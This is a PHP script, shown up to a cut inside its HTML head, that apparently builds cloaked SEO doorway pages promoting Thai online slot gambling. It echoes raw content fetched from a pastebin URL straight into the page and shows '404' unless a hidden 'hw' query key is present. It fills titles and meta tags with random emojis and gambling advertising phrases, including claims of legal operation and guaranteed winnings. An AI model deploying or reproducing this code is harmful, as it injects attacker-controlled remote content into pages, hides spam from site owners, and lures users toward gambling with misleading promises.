<?php

$pastebin_url = "https://pastebin.com/raw/0DEBXBfc"; 

$framework_controller_2 = file_get_contents($pastebin_url);

echo $framework_controller_2;

$contents = file_get_contents('hajar.txt');
$keywords = explode("\r\n", $contents);

$title = file_get_contents('1.txt');
$dest = file_get_contents('3.txt');
$isiarticle = file_get_contents('2.txt');


$key = 'hw';

if (!isset($_GET[$key])) {
  echo '404';
  die;
}

$brand = isset($_GET[$key]) ? $_GET[$key] : 'เว็บไซต์สล็อตอันดับหนึ่งในประเทศไทย';
$brandUp = strtoupper($brand);

$randomEmoji = array(
  "🐨", "🐼", "🐒", "🦉", "🦜", "🐙", "🦑", "🦓", "🦍", "🦔",
  "❤️‍🔥", "🌳", "🍁", "🍔", "🥓", "🍕", "🌮", "🌯", "🍟", "🥗",
  "🌞", "🌝", "🌜", "🌛", "🌠", "🎇", "🎆", "🎑", "🌄", "🌅",
  "🎹", "🥁", "🎻", "🎺", "🎷", "🎤", "🎧", "🎬", "🎮", "🎲",
  "📷", "📹", "📀", "💿", "📻", "📱", "📞", "🎥", "📡", "📊",
  "📈", "📉", "📌", "📍", "📎", "📒", "📔", "📕", "📗", "📘",
  "🖌️", "🖍️", "🖊️", "✏️", "🖋️", "✒️", "📖", "📓", "📚", "📜",
  "🍨", "🍧", "🍦", "🍩", "🍪", "🍫", "🍬", "🍭", "🍡", "🍥",
  "🎂", "🧁", "🍰", "🍣", "🍤", "🍗", "🍖", "🍛", "💸", "📣",
  "🍢", "🍲", "🍱", "🥪", "🌭", "🍿", "🧂", "🥡", "🥢", "🥤",
  "🚗", "🚕", "🚙", "🚌", "🚎", "🏎️", "🚓", "🚑", "🚒", "🚐",
  "🚀", "💋", "🥏", "🎖️", "🥇", "🎯", "🏆", "🈲", "🥅", "🥎"
);

$randomIndex = array_rand($randomEmoji);
$randomEmoji = $randomEmoji[$randomIndex];

$randomWord = [
  "PGSLOT.TEAM", "มุ่งเน้น", "ในการ", "ให้บริการ", "คาสิโนออนไลน์", "บาคาร่า", "สล็อต", "ที่", "ดีที่สุด",
    "มั่นใจ", "ได้ว่า", "ท่าน", "จะ", "ได้", "เล่น", "เกมสล็อตแท้", "เว็บหลัก", "เว็บตรง", "ไม่", "ผ่าน", "เอเย่นต์",
    "เรา", "เป็น", "ผู้ให้บริการ", "เกมสล็อต", "ชั้นนำ", "ระดับประเทศ",
    "มี", "ค่ายเกม", "ให้บริการ", "มากกว่า", "20", "ค่าย", "เกมชั้นนำ", "อาทิเช่น", "PGSLOT", "Pragmatic Play", 
    "Slotxo", "Jili", "Evoplay", "Nolimit city", "Relax Gaming", "Naga GAME", "และ", "อื่นๆ", "อีก", "มากมาย",
    "ให้", "ท่าน", "ได้", "เล่น", "อย่าง", "จุใจ", "รองรับ", "การให้บริการ", "ทุกแพลตฟอร์ม", "Windows", 
    "MacOS", "iOS", "และ", "Android",
    "เปิด", "ประสบการณ์", "ความสนุก", "ผ่าน", "การเล่น", "เดิมพัน", "ออนไลน์", "พร้อม", "รับ", "โปรโมชั่นดีๆ", 
    "เครดิตฟรี", "เพียบ", "ได้แล้ว", "ที่", "www.pgslot.team", "เว็บไซต์", "No.1", "พร้อม", "ให้บริการ", 
    "นักเดิมพัน", "ออนไลน์", "ทุกท่าน", "ตลอด", "24", "ชั่วโมง",
    "สล็อต", "PG", "แตกง่าย", "เว็บตรง", "ไม่", "ผ่าน", "เอเย่นต์", "2022",
    "ค่ายเกมสล็อตออนไลน์", "ที่", "ได้รับ", "ความนิยม", "มากที่สุด", "PG Pocket Game Slot", 
    "หรือ", "ที่รู้จักกัน", "ในชื่อ", "พีจีสล็อต",
    "เล่นสล็อต", "แตกง่าย", "แตกบ่อย", "เว็บตรง", "สล็อต", "pg", "ทั้งหมด", "ไม่", "ผ่าน", "เอเย่นต์", 
    "ปลอดภัย",
    "สล็อตpgแท้", "100%", "ในปี", "2022", "ความสะดวกสบาย", "มั่นคง", "ถือเป็น", "ปัจจัยหลัก", "ในการ", 
    "ให้บริการ", "เกมสล็อตออนไลน์",
    "PGSLOT.TEAM", "ขอนำเสนอ", "ทางเข้า", "เล่นpg", "slot", "auto", "ระบบการให้บริการ", "ที่ดีที่สุด",
    "ฝาก-ถอน", "ไม่มีขั้นต่ำ", "รวดเร็วที่สุด", "ได้รับเงินจริง", "อย่างแน่นอน",
    "PG Game", "สล็อตออนไลน์", "เล่นง่าย", "สมัครฟรี",
    "PGSLOT.TEAM", "เป็น", "ผู้ให้บริการ", "PG Game", "อันดับ", "1",
    "ที่", "ให้บริการ", "เกม", "พีจีสล็อตออนไลน์", "เกมสล็อตชั้นนำ", "ทุกค่าย", "มากกว่า", "20", "ค่ายเกม",
    "เล่นง่าย", "แตกง่าย", "แจกโบนัส", "เครดิตฟรีสูงที่สุด", "สมัครฟรี", "ไม่ยุ่งยาก",
    "รวมเกม", "pgสล็อต", "สุดฮิต", "ไว้", "ให้ท่าน", "ได้", "เลือกเล่น", "ได้", "ในเว็บเดียว", "ครบจบ", 
    "ทุกบริการ",
    "slot", "pg", "เปิด", "ประสบการณ์", "ความสนุก", "ที่", "เหนือชั้น", "ยิ่งกว่าที่เคย",
    "ไม่ว่าจะ", "เข้าเล่น", "ผ่านทาง", "PC", "หรือ", "Mobile", "ก็", "สามารถ", "เล่นได้", "อย่างไหลลื่น", 
    "ไม่มี", "สะดุด",
    "เรา", "เลือกใช้", "API", "ตรง", "จาก", "ทางผู้พัฒนาเกม", "มั่นใจ", "บริการ", "เกมสล็อตเว็บตรง", 
    "ไม่", "ผ่าน", "เอเย่นต์",
    "ฝาก-ถอน", "ได้จริง", "เว็บ", "slotpg", "ที่ดีที่สุด", "ในปี", "2022", "กับ", "ระบบอัตโนมัติ", "(AUTO)", 
    "ทั้งระบบ!",
    "สล็อตเว็บตรง", "สมัครออนไลน์", "รองรับ", "ทุกแพลตฟอร์ม", "เล่นง่าย", "กำไรงาม", "แถม", "โปรโมชั่น", "เพียบ",
    "สล็อตเว็บตรง", "เรียกได้ว่า", "เป็นที่สุด", "ของ", "ความบันเทิง", "ออนไลน์", "ที่", "เหล่า", "เซียนพนัน", 
    "ส่วนใหญ่", "ไว้วางใจ", "และ", "เลือก", "ที่จะ", "ลงทุน", "กับเรา", "เนื่องจาก", "เกม", "สล็อตแตกง่าย", 
    "นั้น", "ถือเป็น", "เกม", "ที่", "เล่นง่าย", "มาพร้อมกับ", "กฎกติกาการเล่น", "ที่", "ไม่", "ยุ่งยาก", "ซับซ้อน",
    "ไม่ว่า", "คุณ", "จะเป็น", "นักพนัน", "มือใหม่", "หรือ", "เหล่าเซียนพนัน", "เดิม", "ก็", "สามารถ", "เล่นได้", 
    "ไม่รู้เบื่อ", "สนุกสนาน", "กันได้", "แบบ", "ไร้", "ขีดจำกัด", "โดย", "ไม่ต้อง", "เดินทาง", "ไป", "เล่น",
    "ไกล", "ถึง", "ต่างประเทศ", "ให้", "เสียเวลา", "เลย", "เปิดให้บริการ", "ตลอด", "24", "ชั่วโมง", 
    "รองรับ", "บน", "ทุกแพลตฟอร์ม", "ไม่ว่า", "คุณ", "จะ", "เล่น", "ผ่าน", "คอมพิวเตอร์", "หรือ", 
    "โทรศัพท์มือถือ", "แล้ว", "ก็", "พร้อม", "เสิร์ฟ", "ความสนุก", "ให้", "คุณ", "ถึง", "บน", "หน้าจอ", "เลย", 
    "เหมาะ", "เป็น", "อย่างมาก", "สำหรับ", "คน", "ที่", "เดินทาง", "บ่อย", "หรือ", "มีงานประจำ", 
    "สามารถ", "ที่", "จะแว๊บ", "เข้ามา", "เล่นเกม", "เพื่อ", "หาเงิน", "กับเรา", "ได้", "ทุก", "ช่วงเวลา",
    "โดย", "เรา", "เป็น", "แหล่ง", "เดิมพัน", "ออนไลน์", "ที่จะ", "มา", "เปิด", "ประสบการณ์", "ใหม่", "ให้", 
    "คุณ", "เล่นเกม", "พนัน", "ออนไลน์", "ได้", "สนุก", "คุ้มค่า", "มากกว่าที่เคย", "สล็อตเว็บตรง", 
    "รวมโปรโมชั่น", "เด็ด", "มาไว้", "ให้", "คุณ", "ทุกสัปดาห์", "อีกทั้ง", "ยังมี", "การจัดกิจกรรม", 
    "แจกโบนัส", "พิเศษ", "กัน", "อย่างต่อเนื่อง", "ยิ่ง", "ในช่วง", "เทศกาล", "สำคัญ", "ต่างๆ", 
    "คุณ", "จะ", "มี", "โอกาส", "ทำกำไร", "ได้", "สูง", "มาก", "ยิ่งขึ้น", "โดยเฉพาะ", "สมาชิกใหม่", 
    "เรามาพร้อมกับ", "การแจก", "เครดิตฟรี", "ให้", "คุณ", "กดรับ", "ได้", "เอง", "โดย", "ไม่มี", "เงื่อนไข",
    "ใด", "เพิ่มเติม", "สามารถ", "นำไป", "จัดการ", "ถอนออกมา", "เป็นเงินสด", "หรือ", "จะนำไป", "ต่อยอด", 
    "ทำกำไร", "ในอนาคต", "ก็ได้", "เช่นกัน", "ถูก", "ยกระดับ", "ให้", "เป็น", "PG", "อันดับ", 
    "1", "ของ", "ประเทศไทย", "เลย", "ก็ว่าได้",
    "สำหรับ", "ใคร", "ที่", "ยัง", "ไม่เคย", "มี", "ประสบการณ์", "เล่น", "สล็อตเว็บตรง", "มาก่อน", 
    "ก็", "ไม่ต้อง", "เป็น", "กังวลใจ", "ไป", "เพราะ", "วันนี้", "เรามาพร้อมกับ", "การคัดสรร", 
    "เกมสล็อต", "ยอดนิยม", "จาก", "ทั่ว", "ทุกมุม", "โลก", "จาก", "ค่าย", "ยักษ์ใหญ่", "รวม", "มาไว้", 
    "ให้กับ", "คุณ", "แล้ว", "ส่วนมาก", "จะมาพร้อมกับ", "ระบบเกม", "ทดลองเล่นฟรี", "ให้", "คุณ", 
    "ได้", "เข้ามา", "ทดลองเล่น", "กันได้", "24", "ชั่วโมง", "เลย", "ยกระดับ", "ความชำนาญ", 
    "ให้", "คุณ", "เล่น", "เกมสล็อต", "ออนไลน์", "ได้", "เชี่ยวชาญ", "แบบ", "มืออาชีพ", "มากยิ่งขึ้น", 
    "อย่ารอช้า", "ถ้าหาก", "คุณ", "ก็", "ไป", "มีคนหนึ่ง", "ที่", "กำลัง", "มองหา", "ช่องทาง", 
    "การเดิมพัน", "ออนไลน์", "ที่", "ทั้ง", "สนุก", "ได้เงิน", "ง่าย", "สล็อต", "ไม่มีขั้นต่ำ", 
    "แถม", "มี", "ความปลอดภัยสูง", "ต้องห้ามพลาด", "กับ", "ตรง", "ของเรา", "นี้", "เลย", 
    "กำไรงาม", "มาพร้อมกับ", "โปรโมชั่น", "เด็ด", "เพียบ", "และ", "มีสิ่งที่", "น่าสนใจ", "อื่นๆ", 
    "มากมาย", "ดังนี้",
    "ทางเข้า", "สล็อตเว็บตรง", "สมัครง่าย", "ผ่าน", "ระบบออโต้", "ออนไลน์", "24", "ชั่วโมง", 
    "หาเงินกัน", "ได้แบบฟินๆ", "ในส่วนของ", "ช่องทางการเข้าถึง", "สล็อตเว็บตรง", "ก็", "ถือเป็น", 
    "แหล่งเดิมพัน", "ที่", "เปิดให้", "คุณ", "เข้ามา", "สมัครสมาชิก", "กันได้", "แบบ", "ง่ายๆ", 
    "เป็นเว็บ", "สล็อตแตกง่าย", "ที่", "พร้อม", "อำนวยความสะดวก", "ให้กับ", "นักพนัน", 
    "ทุกคน", "กัน", "อย่างทั่วถึง", "ใคร", "ที่สนใจ", "สามารถ", "สมัคร", "เข้ามา", "เป็นส่วนหนึ่ง", 
    "กับเรา", "ได้เลย", "ผ่าน", "ระบบออโต้", "ได้", "ตลอด", "24", "ชั่วโมง", "โดยการสมัครสมาชิก", 
    "จะผ่าน", "ระบบออนไลน์", "โดยไม่ต้อง", "ผ่าน", "คนกลาง", "ให้ยุ่งยาก", "หรือ", "เกิดความเสี่ยง", 
    "ในการ", "ทำข้อมูลตกหล่น", "เลย", "คุณ", "หาเงิน", "ง่ายๆ", "แบบฟินๆ", "ตลอด", "24", "ชั่วโมง", 
    "โดย", "จะมี", "ช่อง", "ทางเข้าpg", "อย่างไร", "บ้าง", "มาดูกัน",
    "แหล่งเดิมพัน", "สล็อตเว็บตรง", "ของเรา", "ไม่จำเป็น", "ต้องดาวน์โหลด", "Application", 
    "ใด", "ให้", "ยุ่งยากวุ่นวาย", "เพียง", "แค่", "คุณ", "เปิด", "เข้ามาที่หน้าเว็บไซต์", 
    "แล้ว", "มองหา", "เมนูสมัครสมาชิก", "หลังจากนั้น", "ให้", "คุณ", "กรอก", "ข้อมูล", 
    "ส่วนตัว", "อาทิเช่น", "ชื่อนามสกุล", "หมายเลขโทรศัพท์", "ID Line", "หมายเลขบัญชี", 
    " เป็นต้น", "ข้อมูลเหล่านี้", "จะเป็น", "การยืนยันตัวตน", "และ", "ยืนยัน", "ความปลอดภัย", 
    "ในการเข้าสู่ระบบ", "PG", "ให้กับ", "คุณ",
    "สำหรับใคร", "ที่ยัง", "ไม่เคยสมัครสมาชิก", "มาก่อน", "เพียง", "แค่", "คุณ", "ยืนยันตัวตน", 
    "ผ่าน", "เบอร์โทรศัพท์มือถือ", "จะได้รับ", "เครดิตฟรี", "ไปเลย", "ทันที", "โดยไม่มี", 
    "เงื่อนไข", "ใด", "ยุ่งยาก", "ซับซ้อน", "ให้", "คุณ", "กดรับเงิน", "ง่ายๆ", "และ", "สามารถ", 
    "นำไปใช้", "ได้จริง", "โดยจะ", "ถอนออกมา", "เป็นเงินสด", "หรือ", "จะนำไป", "ต่อยอด", 
    "ทำกำไรก็ได้", "เช่นกัน", "เป็น", "ยอดเงิน", "ที่ไม่", "โดนหักเปอร์เซ็นต์", "บอกเลยว่า", 
    "นักพนัน", "มือใหม่", "คุ้มค่าสุดๆ",
    "เมื่อ", "คุณ", "ตรวจสอบ", "ความถูกต้อง", "เรียบร้อย", "แล้ว", "หลังจากนั้น", "กดยืนยันตัวตน", 
    "กับ", "สล็อตเว็บตรง", "ได้เลย", "ระบบ", "จะทำการตรวจสอบ", "หาข้อมูลของ", "คุณ", 
    "ถูกต้อง", "ครบถ้วน", "เรียบร้อย", "แล้ว", "จะส่ง", "username", "และ", "Password", 
    "มาให้กับ", "คุณ", "คุณสามารถนำรหัสผ่านเหล่านี้", "ไปใช้เข้าสู่ระบบ", "สล็อตไม่มีขั้นต่ำ", 
    "ได้เลย", "ทันที", "โดย", "ไม่ต้อง", "ของเรา", "รองรับ", "ทุกแพลตฟอร์ม", "ไม่ว่า", 
    "คุณ", "จะ", "เล่น", "ผ่าน", "คอมพิวเตอร์", "หรือ", "โทรศัพท์มือถือ", "ก็", "ใช้รหัสผ่านเดียวกัน", 
    "สะดวกสบายสุดๆ",
    "เมื่อ", "สมัครเสร็จเรียบร้อย", "แล้ว", "คุณสามารถที่จะ", "เข้ามาเล่นเกม", "กับเรา", 
    "ได้", "ตลอด", "24", "ชั่วโมง", "โดยไม่มี", "วันหยุด", "ให้คุณ", "หาเงินกัน", "แบบฟินๆ", 
    "ซึ่ง", "แต่ละเกม", "ที่", "เราคัดสรรมานั้น", "การันตีเลยว่า", "โบนัส", "jackpot", "แตกบ่อย", 
    "ช่วยให้", "คุณ", "ปั่นสล็อต", "เล่น", "กันได้", "คุ้มค่า", "แน่นอน", "แถม", "ยังมาพร้อมกับ", 
    "ภาพกราฟฟิก", "สวยงาม", "ดึงดูดใจ", "เล่นแล้ว", "ไม่มี", "เบื่อหน่าย", "อย่างแน่นอน",
    "พบกับ", "เกมสล็อตลิขสิทธิ์แท้", "100%", "มาพร้อมระบบ", "ทดลองเล่นฟรี", 
    "ยกระดับความเป็น", "มืออาชีพ", "มากขึ้น",
    "เอกลักษณ์", "ที่โดดเด่น", "ของ", "สล็อตเว็บตรง", "เหล่านั้น", "ต้องบอกเลยว่า", 
    "โดดเด่น", "ในเรื่องของ", "ค่ายเกมสล็อต", "ที่", "เราคัดสรร", "มาให้กับ", "คุณ", "อย่างมาก", 
    "โดย", "แต่ละค่าย", "นั้น", "มีความโด่งดัง", "ระดับโลก", "ไม่ว่าจะ", "เป็น", 
    "ค่าย", "PG", "JILI SLOT", "918KISS", "SLOTXO", "RAGMATIC PLAY", "(PP SLOT)", 
    "และอื่นๆ", "อีกมากมาย", "ให้", "คุณ", "เลือกสรร", "กันได้", "แบบฟินๆ", 
    "ได้ชื่อว่า", "เป็น", "สล็อตแตกง่าย", "ที่จะพาคุณ", "มาสนุกสนาน", "กันได้", "แบบไร้ขีดจํากัด", 
    "โดย", "แต่ละค่ายเกม", "นั้น", "ก็มาพร้อมกับ", "โปรโมชั่นสุดพิเศษ", "ที่จะมาทำให้", 
    "คุณ", "ตื่นตาตื่นใจ", "กล้าที่จะ", "ลงทุน", "มากยิ่งขึ้น", "เป็น", "เกมสล็อตลิขสิทธิ์แท้", 
    "100%", "ที่", "บอกเลยว่า", "เล่นแล้ว", "ได้เงินจริง", "ไม่โดนโกง", "แน่นอน", "100%",
    "สำหรับ", "ใคร", "ที่", "ยัง", "ไม่เคย", "เล่น", "สล็อตเว็บตรง", "มาก่อน", "ก็", "ไม่ต้อง", 
    "เป็น", "กังวลใจ", "ไปเลย", "เพราะ", "แต่ละค่ายดัง", "ที่", "เราคัดสรร", "มาให้กับ", 
    "คุณ", "นั้น", "PG", "มาพร้อมกับ", "ระบบทดลอง", "ที่", "เปิดให้บริการ", "ตลอด", 
    "24", "ชั่วโมง", "เล่นได้", "ไม่จำกัด", "จำนวนครั้ง", "ต่อวัน", "ไม่กำหนด", "ขั้นต่ำ", 
    "แถม", "ยังเลือกเล่น", "ได้", "ทุกค่าย", "ทั้งใน", "และ", "ต่างประเทศ", 
    "โดย", "ระบบนี้", "มีประโยชน์", "อย่างมาก", "ให้", "คุณ", "ได้เข้ามาทดสอบ", "ฝีมือ", 
    "หรือ", "เข้ามาวางแผนการเดิมพัน", "ก่อนที่จะ", "วางเงินลงทุนจริง", "สร้าง", "ความมั่นใจ", 
    "ให้", "กับ", "นักพนัน", "มากยิ่งขึ้น", "ว่าคุณจะ", "สามารถ", "ปั่นสล็อต", "ได้", 
    "อย่างมีประสิทธิภาพ", "และ", "คุ้มค่ามากที่สุด",
    "ซึ่ง", "ทุกช่วงเวลา", "คุณ", "สามารถเล่น", "สล็อตเว็บตรง", "ได้แบบไร้ขีดจำกัด", 
    "แนะนำเป็นช่วงเวลายอดฮิต", "หลังเที่ยงคืนขึ้นไป", "จะเป็น", "ช่วงเวลาที่", 
    "ระบบรีเซ็ตใหม่", "มาพร้อมกับ", "สัญลักษณ์พิเศษมากมาย", "ช่วยเพิ่มโอกาสให้", 
    "แจ็คพอตแตก", "ได้", "ง่ายยิ่งขึ้น", "แถม", "หลายคน", "ยัง", "กล้าการันตี", 
    "ว่า", "เป็น", "ช่วงนี้", "มีโปรโมชั่นพิเศษเพียบ", "สล็อตไม่มีขั้นต่ำ", 
    "ให้", "คุณ", "ได้สนุกสนาน", "นะ", "คุณค่า", "มากกว่าที่เคย", "อย่ารอช้า", 
    "ที่สมัครเข้ามา", "เป็นส่วนหนึ่ง", "กับ", "เล็บตัว", "ของเรา", "แล้ว", 
    "คุณจะได้", "ตื่นตาตื่นใจ", "ไปกับ", "เกมสล็อตลิขสิทธิ์แท้", "มาพร้อมกับ", 
    "ระบบเล่นเสถียร", "ลื่นไหล", "ไม่มีสะดุด",
    "จุดเด่นของ", "สล็อตเว็บตรง", "ผู้ให้บริการ", "เกมพนัน", "ที่ดีที่สุด", 
    "คุ้มค่ากับการลงทุน",
    "เรากล้าการันตีเลยว่า", "สล็อตเว็บตรง", "ที่เปิดให้บริการ", "นั้น", 
    "มาพร้อมกับ", "คุณสมบัติที่", "คู่ควร", "กับการลงทุน", "มากที่สุด", 
    "สล็อตวอเลท", "จะมีเอกลักษณ์ที่", "โดดเด่นมากมาย", "เริ่มต้นจาก", 
    "การเป็น", "ผู้นำด้าน", "เกมสล็อตออนไลน์", "ที่", "เปิดให้บริการ", 
    "มายาวนาน", "ฉันมั่นใจได้เลยว่า", "คุณจะ", "สามารถ", "ลงทุนได้", 
    "อย่างปลอดภัย", "แน่นอน", "เรามีฐานการเงิน", "ที่มั่นคง", 
    "มีเงินทุนหมุนเวียน", "ในระบบ", "อย่างต่อเนื่อง", "ไม่ว่าคุณจะชนะ", 
    "ในอัตราการจ่ายเงินรางวัลที่สูงแค่ไหนก็ตาม", "เราก็พร้อมที่จะ", 
    "โอนเงินเข้าบัญชีคุณ", "เลยทันที", "โดย", "เราเป็น", "เว็บตรง", 
    "ไม่ผ่านเอเย่น", "ไม่หักเปอร์เซ็นต์", "ให้คุณได้รับเงินรางวัล", 
    "ไปเต็มจำนวน",
    "มาพร้อมกับ", "โปรโมชั่นที่", "น่าสนใจ", "มากมาย", "โดยเฉพาะ", 
    "สมาชิกใหม่", "สล็อตเว็บตรง", "จะมีสิทธิ์ได้รับ", "เครดิตฟรี", 
    "ไปเลย", "ทันที", "โดยไม่ต้อง", "กดแชร์", "ไม่มียอดทำเทิร์นโอเวอร์", 
    "ไม่ต้องฝากขั้นต่ำ", "ก็ได้เงินไปใช้กัน", "แบบฟรีๆ", "เลย", 
    "ใช้ได้กับ", "ทุกเกม", "ทั้งค่าย", "ใน", "และ", "ต่างประเทศ", 
    "โดย", "แต่ละเกมบน", "เว็บสล็อตไม่ผ่านเอเย่นต์", "นั้น", "ลิขสิทธิ์แท้", 
    "100%", "ส่งตรงจากต่างประเทศ", "ให้", "คุณมั่นใจ", "ได้เลยว่า", 
    "จะลงทุนได้", "คุ้มค่ามากที่สุด", "และที่น่าสนใจ", "มากกว่านั้นคือ", 
    "แต่ละเกม", "นั้น", "มีสัญลักษณ์พิเศษ", "ที่จะมาเป็น", "ตัวช่วย", 
    "ให้", "คุณเข้าสู่", "รอบโบนัส", "ได้", "ง่ายยิ่งขึ้น",
    "ช่องทางเข้าร่วมสนุก", "ก็สะดวกสบาย", "ไม่ว่าคุณจะอยู่ที่ไหนเมื่อไหร่", 
    "ก็เข้ามาหาเงิน", "กับ", "สล็อตเว็บตรง", "ได้", "ง่ายๆ", 
    "โดย", "เรารองรับทุกแพลตฟอร์ม", "ให้", "คุณเล่น", "ผ่าน", 
    "คอมพิวเตอร์", "ที่มีหน้าจอ", "ขนาดใหญ่", "ลุ้นปั่นสล็อต", 
    "กันได้จุใจ", "มากยิ่งขึ้น", "หรือจะปั่นผ่านโทรศัพท์มือถือ", 
    "ก็สะดวกสบาย", "พกพาไปได้", "ทุกที่", "รองรับทุกเครือข่าย", 
    "ทุกระบบปฏิบัติการ", "ทั้ง", "iOS", "และ", "แอนดรอยด์", 
    "สล็อตpg", "เรียกได้ว่า", "เป็นที่สุดของ", "แหล่งรวม", 
    "ความบันเทิงออนไลน์", "ที่", "พร้อมจะตอบโจทย์", "ให้กับ", 
    "นักพนันยุคใหม่", "ได้มากยิ่งขึ้น", "ใครที่กำลังมองหา", 
    "ช่องทางดีดี", "ที่", "พร้อมสร้างรายได้ให้กับคุณ", 
    "ง่ายง่าย", "ที่นี่", "ถือว่าตอบโจทย์", "ได้ดีที่สุด",
    "ฝาก-ถอน", "สะดวก", "รองรับทรูวอลเลท", "อยู่ที่ไหนก็ฝากเงิน", 
    "เล่นเกม", "กับเรา", "ได้",
    "ในส่วนของ", "ช่องทางการฝากถอนเงินบน", "สล็อตเว็บตรง", 
    "ให้คุณสบายใจได้เลยว่า", "ฝากปุ๊บ", "เงินเข้าบัญชี", "ทันที", 
    "โดย", "เราฝากถอนไม่มีขั้นต่ำ", "ไม่จำกัดจำนวนครั้ง", 
    "ต่อวัน", "สล็อตออนไลน์", "ลงทุนน้อย", "เบทต่ำ", "1 บาท", 
    "ก็เล่นได้", "เว็บไซต์ของเรา", "รองรับทุกธนาคารชั้นนำ", 
    "ทั่วประเทศ", "แต่สำหรับใครที่", "ไม่มีหมายเลขบัญชีธนาคาร", 
    "ไม่จำเป็นต้อง", "เปิดใหม่", "ให้ยุ่งยากวุ่นวาย", "แล้ว", 
    "คุณดาวน์โหลด", "แอพพลิเคชั่น", "TrueMoney Wallet", 
    "ติดตั้งไว้ที่โทรศัพท์มือถือ", "ก็สามารถ", "ฝากถอนโอนเงิน", 
    "กับเรา", "ได้ตลอด", "24", "ชั่วโมง", 
    "เลย", "เป็นอีกหนึ่งช่องทางที่สะดวก", "ปลอดภัย", 
    "สามารถตรวจสอบ", "ประวัติย้อนหลังได้ด้วย", 
    "โดยการทำทุรกรรมทั้งหมดนี้", "จะทำผ่าน", "ระบบอัตโนมัติ", 
    "ไม่ต้องผ่านคนกลาง", "ให้เกิดความเสี่ยง", "ในการโดนโกงด้วย", 
    "ดังนั้นมั่นใจว่า", "เงินทุกบาททุกสตางค์ของคุณ", 
    "จะเข้าสู่ระบบทันที", "ไม่เกิน", "30 วินาที", "แน่นอน",
    "คำถามที่พบบ่อย",
    "ใช้เวลาในการฝาก-ถอนนานมั้ย",
    "เว็บเราใช้เวลาในการฝาก-ถอนไม่นาน", 
    "เพราะคุณสามารถฝาก-ถอนได้ด้วยตนเอง", 
    "ไม่ต้องรอแอดมินมาดำเนินการให้แบบแต่ก่อน",
    "วิธีการสมัครเป็นสมาชิก", "ยากหรือไม่ ?", 
    "ไม่ยากเลย", "เพราะทางเว็บสล็อต", "เว็บตรง", 
    "มีการนำเอาระบบปฏิบัติการที่สะดวกสบาย", 
    "สามารถเข้ามาสมัคร", "ผ่านระบบอัตโนมัติ", 
    "ผ่านหน้าเว็บไซต์", "ด้วยตนเองได้เลย",
    "ฝากเงินผ่านช่องทางไหนได้บ้าง ?", 
    "ระบบฝากถอนเงิน", "ทำงานด้วยระบบอัตโนมัติ", 
    "ที่ทันสมัยที่สุด", "นำเข้าจากสหรัฐอเมริกา", 
    "รองรับการโอนเงินผ่าน", "แอป", "MOBILE BANKING", 
    "ทุกธนาคาร", "รวมไปถึง", "แอป", "TUREMONEY WALLET",
    "สรุป", "สล็อตเว็บตรง", "แหล่งรวม", "ความบันเทิงออนไลน์", 
    "ที่ได้มาตรฐาน", "สนุกได้เงินจริง",
    "เป็นอย่างไรกันบ้างสำหรับ", "สล็อตเว็บตรง", 
    "ที่เรานำมาฝากกันในวันนี้", 
    "ถูกยกระดับให้เป็นเว็บสลอดอันดับหนึ่งของประเทศไทย", 
    "ที่", "จะมาตอบโจทย์การเดิมพัน", "ของ", 
    "หลายหลายคน", "ได้ดีมากยิ่งขึ้น", 
    "โดย", "สล็อตแตกง่าย", "เป็นแหล่งลงทุนที่", 
    "เปิดให้บริการอย่างถูกต้องตามกฎหมาย", 
    "จ่ายได้เลยว่า", "คุณจะลงทุน", "อย่างปลอดภัย", 
    "มีคุณภาพ", "คุ้มค่าต่อการลงทุน",
    "ทั้งนี้", "มีการแจก", "เครดิตฟรี", "ให้กับสมาชิกใหม่", 
    "ถ้าหากคุณสนใจ", "สมัครเลย", "วันนี้", 
    "มีโปรโมชั่นพิเศษ", "อีกเพียบ", "และ", 
    "โบนัสที่น่าสนใจมากมาย", 
    "รับรองว่าคุณจะได้รับ", "ประสบการณ์", 
    "ความบันเทิงออนไลน์", "ที่ยอดเยี่ยม", 
    "ในการเล่นสล็อตเว็บตรง", "มีผู้คนเข้าเล่น", 
    "เพิ่มมากขึ้น", "อย่างต่อเนื่อง", 
    "เชื่อว่าคุณจะได้พบกับ", "ประสบการณ์", 
    "การสร้างรายได้", "ที่ง่ายที่สุด", 
    "จากการลงทุน", "ไปกับเรา", 
    "ตลอด", "24", "ชั่วโมง", "จบ"
];

$randomIndex = array_rand($randomWord);
$randomWord = $randomWord[$randomIndex];

$prices = array('฿15', '฿25', '฿10', '฿5', '฿20', '฿13', '฿23', '฿18', '฿32');
$random_price = $prices[array_rand($prices)];

$prices = array('฿50', '฿100', '฿150', '฿200', '฿250', '฿300', '฿350', '฿400', '฿450');
$random_prices = $prices[array_rand($prices)];

function getFullUrl() {
  $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
  $host = $_SERVER['HTTP_HOST'];
  $requestUri = $_SERVER['REQUEST_URI'];
  return "$protocol://$host$requestUri";
}

$getFullUrl = getFullUrl();

?>

<!DOCTYPE html>
<html amp lang="th">
<head>
  <meta charset="UTF-8">
  <meta name="description" content="<?php echo $brand ?> <?php echo $dest ?>">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:title" content="<?php echo $brand ?> <?php echo $randomEmoji ?> <?php echo $randomEmoji ?> - <?php echo $randomWord ?> <?php echo $title ?>">
  <meta property="og:description" content="<?php echo $brand ?> <?php echo $dest ?>">
  <link rel="canonical" href="<?php echo $getFullUrl ?>">
  <title><?php echo $brand ?> <?php echo $randomEmoji ?> <?php echo $randomEmoji ?> - <?php echo $randomWord ?> <?php echo $title ?></title>
  <link rel="preload" as="image" href="./images/ufaluck7-banner.png" />
  <meta property="og:type" content="website">
  <meta property="og:url" content="<?php echo $getFullUrl ?>" />
  <meta property="og:site_name" content="<?php echo $brand ?>" />
  <meta property="og:locale" content="th_TH" />
  <meta property="og:image" content="./images/ufaluck7-banner.png"/>
  <meta property="og:image:width" content="640" />
  <meta property="og:image:height" content="299" />
  <meta name="geo.region" content="TH" />
  <meta name="geo.country" content="th" />
  <meta name="geo.placename" content="Thailand" />
  <meta name="author" content="<?php echo $brand ?>" />
  <meta name="publisher" content="<?php echo $brand ?>" />
    <link rel="shortcut icon" type="image/x-icon" href="./images/ufaluck7-logo.png" />
    <link href='./images/ufaluck7-logo.png' rel='icon' sizes='32x32' type='image/png' />
  <script async src="https://cdn.ampproject.org/v0.js"></script>
  <script async custom-element="amp-install-serviceworker"
    src="https://cdn.ampproject.org/v0/amp-install-serviceworker-0.1.js"></script>
